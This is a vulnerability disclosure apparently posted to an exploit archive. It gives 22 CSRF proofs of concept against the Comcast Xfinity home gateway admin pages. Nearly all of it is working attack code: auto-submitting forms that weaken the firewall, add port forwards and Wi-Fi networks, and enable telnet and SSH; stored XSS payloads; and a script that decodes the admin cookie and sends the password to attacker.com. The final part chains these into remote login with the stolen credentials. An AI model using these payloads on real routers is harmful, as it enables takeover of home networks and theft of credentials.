AUTHOR: Pabstersac
DATE: 1ST OF AUGUST 2016
CVE: N/A
CATEGORY: REMOTE
CONTACT: pabstersac@gmail.com
 
IF ANYONE HAS COMMUNICATION WITH VENDOR PLEASE NOTIFY THEM SINCE THEY HAVE IGNORED ME.
CSRF FOR COMCAST XFINITY WEB GATEWAY. LEADS TO RCE AND ACCESS TO THE NETWORK AND MORE.
VENDOR HAS BEEN NOTIFIED NUMEROUS TIMES BUT NO RESPONSE RECEIVED.
 
1) ADD BLOCKED SITE
 
<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_add_blockedSite.php" method="post">
 
<input type="hidden" name=&#039;BlockInfo&#039; value=&#039;{"URL": "http://test1.com", "alwaysBlock": "true"}&#039;>
 
</form>
 
<script>document.x.submit();</script>
 
 
2) ADD BLOCKED KEYWORD
 
<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_add_blockedSite.php" method="post">
 
<input type="hidden" name=&#039;BlockInfo&#039; value=‘{“Keyword”: "http://test1.com", "alwaysBlock": "true"}&#039;>
 
</form>
 
<script>document.x.submit();</script>
 
 
3) REMOVE BLOCKED SITE OR KEYWORD
 
<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_remove_blockedSite.php" method="post">
 
<input type="hidden" name=&#039;removeBlockInfo&#039; value=&#039;{"InstanceID": "6"}&#039;>
 
</form>
 
<script>document.x.submit();</script>
 
 
4) TRUST/UNTRUST DEVICES
 
<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_trust_computer.php" method="post">
 
<input type="hidden" name=&#039;TrustFlag&#039; value=&#039;{"trustFlag": "true", "HostName": "test", "IPAddress": "10.0.0.82"}&#039;>
 
</form>
 
<script>document.x.submit();</script>
 
 
5) DISABLE/ENABLE MANAGED SITES
 
<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_enable_manageSite.php" method="post">
 
<input type="hidden" name=&#039;Enable&#039; value=&#039;{"Enable": "true"}&#039;>
 
</form>
 
<script>document.x.submit();</script>
 
 
6) ADD MANAGED SERVICE (COMES WITH BONUS STORED XSS ;)
 
<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_services.php" method="post">
 
<input type="hidden" name=&#039;add&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;service&#039; value=&#039;<img src=x onerror=alert(0)>&#039;>
<input type="hidden" name=&#039;protocol&#039; value=&#039;UDP&#039;>
<input type="hidden" name=&#039;startPort&#039; value=&#039;1234&#039;>
<input type="hidden" name=&#039;endPort&#039; value=&#039;1234&#039;>
<input type="hidden" name=&#039;block&#039; value=&#039;true&#039;>
 
</form>
 
<script>document.x.submit();</script>
 
 
7) DELETE MANAGED SERVICE
 
http://10.0.0.1/actionHandler/ajax_managed_services.php?del=1
 
 
8) DISABLE/ENABLE MANAGED SERVICES
 
<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_services.php" method="post">
 
<input type="hidden" name=&#039;set&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;UMSStatus&#039; value=&#039;Enabled&#039;>
 
 
</form>
 
<script>document.x.submit();</script>
 
 
9) UNBLOCK DEVICE
 
http://10.0.0.1/actionHandler/ajax_managed_devices.php?del=2
 
 
10) ADD BLOCKED DEVICE (COMES WITH BONUS STORED XSS ;)
 
<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_devices.php" method="post">
 
<input type="hidden" name=&#039;add&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;type&#039; value=&#039;Block&#039;>
<input type="hidden" name=&#039;name&#039; value=&#039;<img src=x onerror=alert(0)>&#039;>
<input type="hidden" name=&#039;mac&#039; value=&#039;xx:xx:xx:xx:xx:x2&#039;>
<input type="hidden" name=&#039;block&#039; value=&#039;true&#039;>
 
 
</form>
 
<script>document.x.submit();</script>
 
 
11) ENABLE/DISABLE MANAGED DEVICES
 
<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_devices.php" method="post">
 
<input type="hidden" name=&#039;set&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;UMDStatus&#039; value=&#039;Enabled&#039;>
 
 
 
</form>
 
<script>document.x.submit();</script>
 
 
12) ADD PORT FORWARDING SERVICE (COMES WITH BONUS STORED XSS ;)
 
<form name="x" action="http://10.0.0.1/actionHandler/ajax_port_forwarding.php" method="post">
 
<input type="hidden" name=&#039;add&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;name&#039; value=&#039;<img src=x onerror=alert(1)>&#039;>
<input type="hidden" name=&#039;protocol&#039; value=&#039;TCP/UDP&#039;>
<input type="hidden" name=&#039;ip&#039; value=&#039;10.0.0.82&#039;>
<input type="hidden" name=&#039;ipv6addr&#039; value=&#039;x&#039;>
<input type="hidden" name=&#039;startport&#039; value=&#039;123&#039;>
<input type="hidden" name=&#039;endport&#039; value=&#039;123&#039;>
 
</form>
 
<script>document.x.submit();</script>
 
 
13) DELETE A PORT FORWARDING SERVICE
 
http://10.0.0.1/actionHandler/ajax_port_forwarding.php?del=5
 
 
14) EDIT EXISTING PORT FORWARDING SERVICES
 
<form name="x" action="http://10.0.0.1/actionHandler/ajax_port_forwarding.php" method="post">
 
<input type="hidden" name=&#039;edit&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;name&#039; value=‘huhuhuh???New Name then …’>
<input type="hidden" name=&#039;protocol&#039; value=&#039;TCP/UDP&#039;>
<input type="hidden" name=&#039;ip&#039; value=&#039;10.0.0.82&#039;>
<input type="hidden" name=&#039;ipv6addr&#039; value=&#039;x&#039;>
<input type="hidden" name=&#039;startport&#039; value=&#039;123&#039;>
<input type="hidden" name=&#039;endport&#039; value=&#039;123&#039;>
<input type="hidden" name=&#039;ID&#039; value=&#039;4&#039;>
 
 
</form>
 
<script>document.x.submit();</script>
 
 
15) ENABLE/DISABLE PORT FORWARDING
 
<form name="x" action="http://10.0.0.1/actionHandler/ajax_port_forwarding.php" method="post">
 
<input type="hidden" name=&#039;set&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;UFWDStatus&#039; value=&#039;Enabled&#039;>
 
 
 
</form>
 
<script>document.x.submit();</script>
 
 
I’ll ignore port triggering cuz idc about port triggering . . .
 
16) CHANGE REMOTE MANAGEMENT SERVICE
 
<form name="x" action="http://10.0.0.1/actionHandler/ajax_remote_management.php" method="post">
 
<input type="hidden" name=&#039;http&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;httport&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;https&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;httpsport&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;allowtype&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;startIP&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;endIP&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;telnet&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;ssh&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;startIPv6&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;endIPv6&#039; value=&#039;notset&#039;>
 
 
</form>
 
<script>document.x.submit();</script>
 
 
17) CHANGE FIREWALL SETTINGS
 
<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_firewall_config.php" method="post">
 
<input type="hidden" name=&#039;configInfo&#039; value=&#039;{"firewallLevel": "Low", "block_http": "Disabled", "block_icmp": "Disabled", "block_multicast": "Disabled", "block_peer": "Disabled", "block_ident": "Disabled", "disableFwForTrueStaticIP": "undefined"} &#039;>
 
 
 
</form>
 
<script>document.x.submit();</script>
 
 
18) CHANGE PASSWORD PoC
 
UPLOAD test1.js TO yourjavascript.com (OR USE THE ONE I ALREADY UPLOADED : http://yourjavascript.com/1663477161/test1.js )
CONTENTS ARE:
document.cookie="PHPSESSID=1";k=document.cookie;f=k.replace("PHPSESSID=1","");d=f.replace("auth=","");s=d.replace(";","");g=s.replace("%3D","");t=atob(g);console.log(t);l=t.replace("admin:","");console.log(l);var xhttp=new XMLHttpRequest();xhttp.open("POST","/actionHandler/ajaxSet_password_config.php",true);xhttp.send(&#039;configInfo={"newPassword": “testpassword123”, "oldPassword”: “’+ l+’”}’);
 
SHORTEN URL ON GOOGLE (OR USE THE ONE I ALREADY SHORTENED : http://goo.gl/FQHkQj)
 
CREATE HTML FILE : 
 
<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_devices.php" method="post">
 
<input type="hidden" name=&#039;add&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;type&#039; value=&#039;Block&#039;>
<input type="hidden" name=&#039;name&#039; value=&#039;<script src="http://goo.gl/FQHkQj">&#039;>
<input type="hidden" name=&#039;mac&#039; value=&#039;xx:xx:xx:xx:xx:x8&#039;>
<input type="hidden" name=&#039;block&#039; value=&#039;true&#039;>
 
 
</form>
 
<script>document.x.submit();</script>
 
I PUT ON SRC IN THE SCRIPT TAG MY SHORTENED URL
 
 
19) GET PASSWORD PoC
 
UPLOAD test1.js TO yourjavascript.com
CONTENTS ARE:
document.cookie="PHPSESSID=1";k=document.cookie;f=k.replace("PHPSESSID=1","");d=f.replace("auth=","");s=d.replace(";","");g=s.replace("%3D","");t=atob(g);console.log(t);l=t.replace("admin:","");console.log(l);var xhttp=new XMLHttpRequest();xhttp.open("POST","http://attacker.com/get_password.php",true);xhttp.send(&#039;configInfo={"newPassword": “testpassword123”, "oldPassword”: “’+ l+’”}’);
 
SHORTEN URL ON GOOGLE 
 
CREATE HTML FILE : 
 
<form name="x" action="http://10.0.0.1/actionHandler/ajax_managed_devices.php" method="post">
 
<input type="hidden" name=&#039;add&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;type&#039; value=&#039;Block&#039;>
<input type="hidden" name=&#039;name&#039; value=&#039;<script src="shortened url">&#039;>
<input type="hidden" name=&#039;mac&#039; value=&#039;xx:xx:xx:xx:xx:x8&#039;>
<input type="hidden" name=&#039;block&#039; value=&#039;true&#039;>
 
 
</form>
 
<script>document.x.submit();</script>
 
I PUT ON SRC IN THE SCRIPT TAG MY SHORTENED URL
20) ACCESS DEVICES IN THE NETWORK
<form name="x" action="http://10.0.0.1/actionHandler/ajax_port_forwarding.php" method="post">
 
<input type="hidden" name=&#039;add&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;name&#039; value=&#039;something&#039;>
<input type="hidden" name=&#039;protocol&#039; value=&#039;TCP/UDP&#039;>
<input type="hidden" name=&#039;ip&#039; value=&#039;Target Internal IP&#039;>
<input type="hidden" name=&#039;ipv6addr&#039; value=&#039;x&#039;>
<input type="hidden" name=&#039;startport&#039; value=&#039;Target Port&#039;>
<input type="hidden" name=&#039;endport&#039; value=&#039;Target Port&#039;>
 
</form>
 
<script>document.x.submit();</script>
 
21) CREATE A NEW PRIVATE WI-FI NETWORK WITH THE PASSWORD OF YOUR CHOICE:
 
<form name="x" action="http://10.0.0.1/actionHandler/ajaxSet_wireless_network_configuration_edit.php" method="post">
 
<input type="hidden" name=&#039;configInfo&#039; value=&#039;{"radio_enable":"true", "network_name":"MY-OWN-PRIVATE-PERSONAL-NETWORK", "wireless_mode":"g,n", "security":"WPAWPA2_PSK_TKIPAES", "channel_automatic":"true", "channel_number":"5", "network_password”:”password”, "broadcastSSID":"true", "enableWMM":"true", "ssid_number”:”3”}’>
 
</form>
 
<script>document.x.submit();</script>
 
22) RCE
HTML FILE:
<form name="x" action="http://10.0.0.1/actionHandler/ajax_remote_management.php" method="post">
 
<input type="hidden" name=&#039;http&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;httport&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;https&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;httpsport&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;allowtype&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;startIP&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;endIP&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;telnet&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;ssh&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;startIPv6&#039; value=&#039;notset&#039;>
<input type="hidden" name=&#039;endIPv6&#039; value=&#039;notset&#039;>
 
 
</form>
<!--Do part 19)-->
 
<form name="h" action="http://10.0.0.1/actionHandler/ajax_managed_devices.php" method="post">
 
<input type="hidden" name=&#039;add&#039; value=&#039;true&#039;>
<input type="hidden" name=&#039;type&#039; value=&#039;Block&#039;>
<input type="hidden" name=&#039;name&#039; value=&#039;<script src="shortened url">&#039;>
<input type="hidden" name=&#039;mac&#039; value=&#039;xx:xx:xx:xx:xx:x8&#039;>
<input type="hidden" name=&#039;block&#039; value=&#039;true&#039;>
 
 
</form>
 
 
<form name="f" action="http://10.0.0.1/actionHandler/ajaxSet_firewall_config.php" method="post">
 
<input type="hidden" name=&#039;configInfo&#039; value=&#039;{"firewallLevel": "Low", "block_http": "Disabled", "block_icmp": "Disabled", "block_multicast": "Disabled", "block_peer": "Disabled", "block_ident": "Disabled", "disableFwForTrueStaticIP": "undefined"} &#039;>
 
 
 
</form>
<script>document.x.submit();document.h.submit();document.f.submit();</script>
 
THEN TELNET TO THE IP ADDRESS THAT SENT THE REQUEST TO ATTACKER.COM/GET_PASSWORD.PHP AND USE THE USERNAME &#039;admin&#039; AND THE PASSWORD YOU GOT IN ATTACKER.COM/GET_PASSWORD.PHP


